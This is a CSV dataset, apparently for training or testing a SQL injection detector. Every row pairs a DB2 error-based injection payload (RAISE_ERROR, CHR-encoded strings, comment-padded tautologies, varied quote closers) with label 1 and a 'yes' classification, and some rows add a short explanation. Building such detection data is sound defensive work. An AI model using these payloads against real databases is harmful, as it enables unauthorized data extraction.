input_text,Label,classification
"/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))#/**/dZcC",1,yes
"/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/rDWJ",1,"The input contains elements indicative of SQL injection, including the use of OR, obfuscation with comment delimiters, and dynamic string manipulation to potentially execute arbitrary code or extract data.

yes"
"""/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/""cBlz""/**/LIKE/**/""cBlz",1,yes
""")))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(((""AAtQ""/**/LIKE/**/""AAtQ",1,yes
"""))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((""PtfR""/**/LIKE/**/""PtfR",1,yes
""")/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(""uBaw""/**/LIKE/**/""uBaw",1,yes
"""/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/""bHQQ""=""bHQQ",1,yes
""")))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(((""aubg""=""aubg",1,yes
"""))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((""NpIA""=""NpIA",1,yes
""")/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(""xBEW""=""xBEW",1,yes
"'/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/'XHQE'/**/LIKE/**/'XHQE",1,"The input contains elements indicative of a SQL injection attempt, utilizing OR and RAISE_ERROR to potentially execute malicious commands. 

Answer: yes"
"%'/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/'swfg%'='swfg",1,Yes
"')))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((('TEvh'/**/LIKE/**/'TEvh",1,yes
"'))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(('nZeh'/**/LIKE/**/'nZeh",1,yes
"')/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/('cWYM'/**/LIKE/**/'cWYM",1,"The input contains elements indicative of SQL injection, such as closing parentheses, comment delimiters, and use of functions like RAISE_ERROR with subqueries.

Answer: yes"
"'/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/'jkAC'='jkAC",1,yes
"')))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((('XjAJ'='XjAJ",1,yes
"'))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(('Gzrq'='Gzrq",1,yes
"')/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/('WkWU'='WkWU",1,yes
"/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))",1,yes
")))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(((6318=6318",1,yes
"))/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((7809=7809",1,yes
")/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(2415=2415",1,yes
"""/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/owOI",1,yes
"'/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/FwjQ",1,yes
"')/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/OEWI",1,"The input exhibits characteristics commonly associated with SQL injection attempts, including the use of comments, logical operators like OR, and functions that can execute arbitrary code or reveal system information.

yes"
")/**/OR/**/4730=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(4730=4730)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/mGME",1,yes
"'/**/IN/**/BOOLEAN/**/MODE)/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))#",1,yes
"`)/**/WHERE/**/9035=9035/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/Tfdc",1,yes
"`/**/WHERE/**/1941=1941/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/IOwE",1,Yes
")/**/AS/**/ALfU/**/WHERE/**/5251=5251/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/ecOU",1,"The input contains elements indicative of SQL injection techniques, including tautologies and the use of RAISE_ERROR to potentially extract data.

yes"
""")/**/AS/**/UZXI/**/WHERE/**/3832=3832/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/dFTS",1,yes
"')/**/AS/**/aczL/**/WHERE/**/1700=1700/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/smCy",1,Yes
"))/**/AS/**/kBvV/**/WHERE/**/6620=6620/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/pmUZ",1,yes
"""))/**/AS/**/rzLg/**/WHERE/**/3002=3002/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/wTgA",1,yes
"'))/**/AS/**/sknK/**/WHERE/**/5972=5972/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/Fhgb",1,yes
"'/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/OR/**/'EaNx'='nIjY",1,yes
"/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))#/**/XMGz",1,Yes.
"/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))--/**/vjEd",1,yes
"""/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/""mjSs""/**/LIKE/**/""mjSs",1,yes
""")))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(((""NqyZ""/**/LIKE/**/""NqyZ",1,yes
"""))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((""Shmm""/**/LIKE/**/""Shmm",1,"The input exhibits characteristics of SQL injection, including quote escaping, comment obfuscation, function execution, and subqueries accessing system tables. These elements are indicative of a potential attack.

Answer: yes"
""")/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(""LSFm""/**/LIKE/**/""LSFm",1,yes
"""/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/""DUKn""=""DUKn",1,Yes
""")))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(((""XdKJ""=""XdKJ",1,Yes
"""))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((""qpne""=""qpne",1,Yes
""")/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(""OiMr""=""OiMr",1,yes
"'/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/'XykC'/**/LIKE/**/'XykC",1,Yes
"%'/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/'VSvB%'='VSvB",1,Yes
"')))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((('lAHH'/**/LIKE/**/'lAHH",1,yes
"'))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(('Chdg'/**/LIKE/**/'Chdg",1,yes
"')/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/('CpcG'/**/LIKE/**/'CpcG",1,yes
"'/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/'DfTE'='DfTE",1,Yes
"')))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/((('OArN'='OArN",1,yes
"'))/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/(('ejkX'='ejkX",1,Yes.
"')/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))/**/AND/**/('RIVO'='RIVO",1,yes
"/**/AND/**/5843=RAISE_ERROR(CHR(55)||CHR(48)||CHR(48)||CHR(48)||CHR(49),CHR(113)||CHR(98)||CHR(112)||CHR(112)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(5843=5843)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/SYSIBM.SYSDUMMY1)||CHR(113)||CHR(113)||CHR(112)||CHR(106)||CHR(113))",1,yes
